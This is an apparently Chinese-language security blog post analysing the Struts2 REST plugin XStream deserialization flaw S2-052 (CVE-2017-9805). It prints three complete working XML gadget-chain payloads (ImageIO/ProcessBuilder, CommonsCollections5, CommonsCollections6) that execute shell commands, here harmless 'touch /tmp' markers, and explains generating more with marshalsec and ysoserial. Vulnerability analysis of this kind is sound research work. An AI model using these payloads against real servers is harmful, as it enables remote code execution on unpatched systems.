<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Manning23"><title>Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805 · Manning23</title><meta name="description" content="0x00 漏洞介绍Struts2 S2-052远程代码执行漏洞和以往的Struts2漏洞是不同的，S2-052利用的是Java反序列化漏洞，而不是臭名昭著的ognl。本次漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Manning23</a></h3><div class="description"><p>Technology &amp; Life</p></div></div></div><ul class="social-links"><li><a href="http://weibo.com/2077484845"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li></div><div class="information"><div class="back_btn"><li><a onclick="window.history.go(-1)" class="fa fa-chevron-left"> </a></li></div><div class="avatar"><img src="/images/avatar.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805</a></h3></div><div class="post-content"><h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>Struts2 S2-052远程代码执行漏洞和以往的Struts2漏洞是不同的，S2-052利用的是Java反序列化漏洞，而不是臭名昭著的ognl。本次漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。</p>
<p>本次漏洞最精彩的地方是漏洞利用，具体参考接下来的文章。</p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>本次漏洞的成因有两部分组成，一个是 Struts2 REST插件本身没有对进入的数据进行安全检查，导致攻击者可以传入恶意的xml对象可以传入到XStream里。另一个是XStream在反序列化传入的xml造成的远程代码执行。</p>
<p>关键代码在org.apache.struts2.rest.ContentTypeInterceptor里</p>
<pre><code>public String intercept(ActionInvocation invocation) throws Exception {
    HttpServletRequest request = ServletActionContext.getRequest();
    ContentTypeHandler handler = selector.getHandlerForRequest(request);

    Object target = invocation.getAction();
    if (target instanceof ModelDriven) {
        target = ((ModelDriven)target).getModel();
    }

    if (request.getContentLength() &gt; 0) {
        InputStream is = request.getInputStream();
        InputStreamReader reader = new InputStreamReader(is);
        handler.toObject(reader, target);
    }
    return invocation.invoke();
}
</code></pre><p>问题出在以下两点</p>
<ol>
<li>ContentTypeHandler handler = selector.getHandlerForRequest(request);</li>
<li>handler.toObject(reader, target);</li>
</ol>
<p>Struts2的漏洞点本身没什么难度，这个漏洞精彩的地方是漏洞利用方面。</p>
<h2 id="0x02-利用分析"><a href="#0x02-利用分析" class="headerlink" title="0x02 利用分析"></a>0x02 利用分析</h2><p>本次漏洞，最开始的poc生成是利用marshalsec工具生成ImageIO的远程代码序列化对象，这个poc适用的环境是java1.8以上，这是个非常苛刻的条件。</p>
<p>利用的具体代码如下：</p>
<pre><code>&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString&gt;
      &lt;flags&gt;0&lt;/flags&gt;
      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
        &lt;dataHandler&gt;
          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
                &lt;initialized&gt;false&lt;/initialized&gt;
                &lt;opmode&gt;0&lt;/opmode&gt;
                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
                      &lt;command&gt;
                        &lt;string&gt;touch&lt;/string&gt;
                        &lt;string&gt;/tmp/pwn&lt;/string&gt;
                      &lt;/command&gt;
                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
                    &lt;/next&gt;
                  &lt;/iter&gt;
                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
                    &lt;method&gt;
                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
                      &lt;name&gt;start&lt;/name&gt;
                      &lt;parameter-types/&gt;
                    &lt;/method&gt;
                    &lt;name&gt;foo&lt;/name&gt;
                  &lt;/filter&gt;
                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
                &lt;/serviceIterator&gt;
                &lt;lock/&gt;
              &lt;/cipher&gt;
              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
              &lt;ibuffer&gt;&lt;/ibuffer&gt;
              &lt;done&gt;false&lt;/done&gt;
              &lt;ostart&gt;0&lt;/ostart&gt;
              &lt;ofinish&gt;0&lt;/ofinish&gt;
              &lt;closed&gt;false&lt;/closed&gt;
            &lt;/is&gt;
            &lt;consumed&gt;false&lt;/consumed&gt;
          &lt;/dataSource&gt;
          &lt;transferFlavors/&gt;
        &lt;/dataHandler&gt;
        &lt;dataLen&gt;0&lt;/dataLen&gt;
      &lt;/value&gt;
    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
</code></pre><p>这个利用代码利用了在 Java1.8 环境下，ImageIO库的反序列化漏洞，因此利用这个poc在线网上，是很少能打到目标的。ImageIO的利用分析参考阿里大牛的分析 <a href="https://m.aliyun.com/yunqi/articles/197926?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告</a></p>
<p>线上环境使用 Java 1.8 是个非常苛刻的条件，然而有没有在其他版本java的利用代码呢？答案是有的。漏洞的本质是反序列化漏洞，而反序列化工具ysoserial提供了大量的反序列化代码。通过查看marshalsec工具生成XStream的代码，发现利用下面代码再结合ysoserial工具的代码，即可生成更多的利用代码。</p>
<pre><code>public class XStream extends MarshallerBase&lt;String&gt; implements CommonsConfiguration, Rome, CommonsBeanutils, ServiceLoader, ImageIO,
        BindingEnumeration, LazySearchEnumeration, SpringAbstractBeanFactoryPointcutAdvisor, SpringPartiallyComparableAdvisorHolder, Resin, XBean {


    @Override
    public String marshal ( Object o ) throws Exception {
        com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
        return xs.toXML(o);
    }

    @Override
    public Object unmarshal ( String data ) throws Exception {
        com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
        return xs.fromXML(data);
    }

    @Override
    public Object makeComparatorTrigger ( Object tgt, Comparator&lt;?&gt; cmp ) throws Exception {
        return JDKUtil.makePriorityQueue(tgt, cmp);
    }


    public static void main ( String[] args ) {
        new XStream().run(args);
    }
}
</code></pre><p>利用commons.collections系列和XStream可以生成在java1.7环境下稳定利用的poc。生成poc的利用代码如下：</p>
<pre><code>反序列化后会得到 object
com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
String payload = xs.toXML(object);
System.out.println(payload);
</code></pre><h3 id="具体的利用代码如下"><a href="#具体的利用代码如下" class="headerlink" title="具体的利用代码如下"></a>具体的利用代码如下</h3><p>CommonsCollections5 + XStream 的利用</p>
<pre><code>&lt;javax.management.BadAttributeValueExpException&gt;
  &lt;stackTrace&gt;
    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:85)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:1)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner$1.call(PayloadRunner.java:28)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner$1.call(PayloadRunner.java:1)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner.run(PayloadRunner.java:21)&lt;/trace&gt;
    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.main(CommonsCollections5.java:101)&lt;/trace&gt;
  &lt;/stackTrace&gt;
  &lt;suppressedExceptions class=&quot;java.util.Collections$UnmodifiableRandomAccessList&quot; resolves-to=&quot;java.util.Collections$UnmodifiableList&quot;&gt;
    &lt;c class=&quot;list&quot;/&gt;
    &lt;list reference=&quot;../c&quot;/&gt;
  &lt;/suppressedExceptions&gt;
  &lt;val class=&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;&gt;
    &lt;map class=&quot;org.apache.commons.collections.map.LazyMap&quot; serialization=&quot;custom&quot;&gt;
      &lt;unserializable-parents/&gt;
      &lt;org.apache.commons.collections.map.LazyMap&gt;
        &lt;default&gt;
          &lt;factory class=&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;&gt;
            &lt;iTransformers&gt;
              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
                &lt;iConstant class=&quot;java-class&quot;&gt;java.lang.Runtime&lt;/iConstant&gt;
              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;getMethod&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
                  &lt;java-class&gt;[Ljava.lang.Class;&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs&gt;
                  &lt;string&gt;getRuntime&lt;/string&gt;
                  &lt;java-class-array/&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;invoke&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;
                  &lt;java-class&gt;[Ljava.lang.Object;&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs&gt;
                  &lt;null/&gt;
                  &lt;object-array/&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;exec&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs class=&quot;string-array&quot;&gt;
                  &lt;string&gt;touch /tmp/jdk1111&lt;/string&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
                &lt;iConstant class=&quot;int&quot;&gt;1&lt;/iConstant&gt;
              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
            &lt;/iTransformers&gt;
          &lt;/factory&gt;
        &lt;/default&gt;
        &lt;map/&gt;
      &lt;/org.apache.commons.collections.map.LazyMap&gt;
    &lt;/map&gt;
    &lt;key class=&quot;string&quot;&gt;foo&lt;/key&gt;
  &lt;/val&gt;
&lt;/javax.management.BadAttributeValueExpException&gt;
</code></pre><p>CommonsCollections6 + XStream 的利用</p>
<pre><code>&lt;set&gt;
  &lt;org.apache.commons.collections.keyvalue.TiedMapEntry&gt;
    &lt;map class=&quot;org.apache.commons.collections.map.LazyMap&quot; serialization=&quot;custom&quot;&gt;
      &lt;unserializable-parents/&gt;
      &lt;org.apache.commons.collections.map.LazyMap&gt;
        &lt;default&gt;
          &lt;factory class=&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;&gt;
            &lt;iTransformers&gt;
              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
                &lt;iConstant class=&quot;java-class&quot;&gt;java.lang.Runtime&lt;/iConstant&gt;
              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;getMethod&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
                  &lt;java-class&gt;[Ljava.lang.Class;&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs&gt;
                  &lt;string&gt;getRuntime&lt;/string&gt;
                  &lt;java-class-array/&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;invoke&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;
                  &lt;java-class&gt;[Ljava.lang.Object;&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs&gt;
                  &lt;null/&gt;
                  &lt;object-array/&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
                &lt;iMethodName&gt;exec&lt;/iMethodName&gt;
                &lt;iParamTypes&gt;
                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
                &lt;/iParamTypes&gt;
                &lt;iArgs class=&quot;string-array&quot;&gt;
                  &lt;string&gt;touch /tmp/manning123&lt;/string&gt;
                &lt;/iArgs&gt;
              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
                &lt;iConstant class=&quot;int&quot;&gt;1&lt;/iConstant&gt;
              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
            &lt;/iTransformers&gt;
          &lt;/factory&gt;
        &lt;/default&gt;
        &lt;map/&gt;
      &lt;/org.apache.commons.collections.map.LazyMap&gt;
    &lt;/map&gt;
    &lt;key class=&quot;string&quot;&gt;foo&lt;/key&gt;
  &lt;/org.apache.commons.collections.keyvalue.TiedMapEntry&gt;
&lt;/set&gt;
</code></pre><p>利用的效果图展示</p>
<p><img src="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/1.png" width="90%"></p>
<p>在实验中，执行的代码为：</p>
<pre><code>touch /tmp/manning_s2_052
</code></pre><p>在poc打过去后，我们可以在tmp目录发现 manning_s2_052 文件</p>
<p><img src="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/2.png" width="90%"></p>
<p>之前我在微博说利用可能达到11种，这个说法现在来看不准确，理论上marshalsec和ysoserial和SerialKillerBypassGadgetCollection的反序列化利用代码可以在本次的漏洞使用，因此本次漏洞的利用的变化是非常大的。</p>
<p>之前同事提出了一个观点</p>
<pre><code>所有的struts2都有那个组件？，毕竟这个是依赖common-collections3组件，showcase是默认有，其它strtus2的应用有没有啊？
</code></pre><p>针对这个问题，我的看法是</p>
<pre><code>strust2 默认不带这个库，不过很有可能项目中用到的其它库会依赖 collections，毕竟这个库使用量太大，所以感觉应该比 jdk8 更适用一些。
</code></pre><h2 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03 漏洞防御"></a>0x03 漏洞防御</h2><p>由于漏洞利用变化极大，建议暂时关闭有REST插件的Struts2站点。</p>
<h2 id="0x04-参考内容"><a href="#0x04-参考内容" class="headerlink" title="0x04 参考内容"></a>0x04 参考内容</h2><p><a href="https://0bin.net/paste/xI3qQXBnBFi+ZIC6#y151P6VdT9DXPOBqgQviWRECRnW6+gSuK+frvsnAfZy" target="_blank" rel="external">https://0bin.net/paste/xI3qQXBnBFi+ZIC6#y151P6VdT9DXPOBqgQviWRECRnW6+gSuK+frvsnAfZy</a></p>
<p><a href="http://bobao.360.cn/learning/detail/4372.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4372.html</a></p>
<p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="external">https://github.com/mbechler/marshalsec</a></p>
<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></p>
<p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="external">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></p>
<p><a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection" target="_blank" rel="external">https://github.com/pwntester/SerialKillerBypassGadgetCollection</a></p>
<p><a href="https://github.com/pwntester/XStreamPOC" target="_blank" rel="external">https://github.com/pwntester/XStreamPOC</a></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2017-09-10</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank" class="fa fa-bookmark"></a></div><div class="weibo"><a href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));" class="fa fa-weibo"></a></div><div class="twitter"><a href="http://twitter.com/home?status=,http://yoursite.com/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/,Manning23,Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805,;" class="fa fa-twitter"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a role="navigation" href="/2017/08/08/三种特征向量对深度学习攻击检测的影响/" title="三种特征向量对深度学习攻击检测的影响" class="btn">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>